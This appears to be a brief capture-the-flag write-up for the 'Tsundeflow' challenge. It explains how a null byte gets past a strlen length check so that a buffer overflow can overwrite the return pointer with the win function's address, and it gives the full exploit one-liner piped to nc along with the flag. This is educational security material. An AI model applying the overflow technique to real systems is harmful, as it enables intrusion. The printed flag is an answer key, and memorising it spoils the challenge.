# Tsundeflow

**Points:** 80 **Description:** 

## Solution

For this challenge we need to overwrite the return pointer of the program to point to the win function.  But first we need to overcome the input length check by strlen. If we read the man page of strlen we can see that it checks length of string until the null terminator so all we need to do is put a null terminator in our payload.

`(python -c 'print "a"*20+"\x00"+"AAAABBBBCCCCDDD" + "\x7b\x85\x04\x08"'; cat -) | nc <sever> <port>`

Flag is GCTF{51mpl3\_buff3r\_0v3rfl0w_f0r_75und3r35}.